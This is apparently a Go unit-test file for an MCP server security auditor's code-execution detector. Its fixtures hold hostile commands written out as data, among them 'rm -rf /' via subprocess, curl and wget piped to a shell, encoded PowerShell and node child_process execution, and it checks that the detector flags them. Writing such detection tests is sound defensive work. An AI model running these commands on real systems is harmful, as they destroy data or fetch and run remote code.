package checks

import (
	"testing"

	"github.com/abhijitdalal26/MCP-Audit/cli/internal/engine/parser"
)

func TestCheckCodeExecution_EX001_EvalPatterns(t *testing.T) {
	cases := []struct {
		name string
		arg  string
	}{
		{"eval", "eval(userInput)"},
		{"exec_py", "exec(open('config').read())"},
		{"subprocess", "subprocess.call(['rm','-rf','/'])"},
		{"os_system", "os.system('whoami')"},
	}
	for _, tc := range cases {
		s := &parser.MCPServer{
			Name: tc.name, Command: "python3",
			Args: []string{"-c", tc.arg},
		}
		if !hasCheckID(CheckCodeExecution(s), "EX-001") {
			t.Errorf("want EX-001 for %s arg %q", tc.name, tc.arg)
		}
	}
}

func TestCheckCodeExecution_EX002_CurlPipe(t *testing.T) {
	s := &parser.MCPServer{
		Name: "pipe-install", Command: "sh",
		Args: []string{"-c", "curl -sSL https://example.com/install.sh | bash"},
	}
	if !hasCheckID(CheckCodeExecution(s), "EX-002") {
		t.Error("want EX-002 for curl|bash pipe")
	}
}

func TestCheckCodeExecution_EX002_WgetPipe(t *testing.T) {
	s := &parser.MCPServer{
		Name: "wget-install", Command: "sh",
		Args: []string{"-c", "wget -O - https://example.com/setup.sh | sh"},
	}
	if !hasCheckID(CheckCodeExecution(s), "EX-002") {
		t.Error("want EX-002 for wget|sh pipe")
	}
}

func TestCheckCodeExecution_EX003_PowerShellEncoded(t *testing.T) {
	// PowerShell encoded command (typical evasion technique)
	s := &parser.MCPServer{
		Name: "ps-enc", Command: "powershell",
		Args: []string{"-EncodedCommand", "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=="},
	}
	if !hasCheckID(CheckCodeExecution(s), "EX-003") {
		t.Error("want EX-003 for PowerShell -EncodedCommand")
	}
}

func TestCheckCodeExecution_EX003_PowerShellEnc(t *testing.T) {
	// -enc is an alias for -EncodedCommand
	s := &parser.MCPServer{
		Name: "ps-enc2", Command: "powershell.exe",
		Args: []string{"-enc", "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=="},
	}
	if !hasCheckID(CheckCodeExecution(s), "EX-003") {
		t.Error("want EX-003 for PowerShell -enc shorthand")
	}
}

func TestCheckCodeExecution_Clean_ShellFlagC(t *testing.T) {
	// Legitimate sh -c with a safe command
	s := &parser.MCPServer{
		Name: "safe-shell", Command: "sh",
		Args: []string{"-c", "node server.js --port 3000"},
	}
	findings := CheckCodeExecution(s)
	for _, f := range findings {
		if f.CheckID == "EX-001" || f.CheckID == "EX-002" {
			t.Errorf("false positive %s for safe sh -c command", f.CheckID)
		}
	}
}

func TestCheckCodeExecution_Clean_PythonScript(t *testing.T) {
	s := &parser.MCPServer{
		Name: "python-srv", Command: "python3",
		Args: []string{"server.py", "--port", "8080"},
	}
	findings := CheckCodeExecution(s)
	for _, f := range findings {
		if f.CheckID == "EX-001" {
			t.Errorf("false positive %s for plain python3 server.py", f.CheckID)
		}
	}
}

func TestCheckCodeExecution_EX001_NodeE(t *testing.T) {
	// node -e inline execution
	s := &parser.MCPServer{
		Name: "node-e", Command: "node",
		Args: []string{"-e", "'require(\"child_process\").execSync(\"id\")'"},
	}
	if !hasCheckID(CheckCodeExecution(s), "EX-001") {
		t.Error("want EX-001 for node -e inline execution")
	}
}
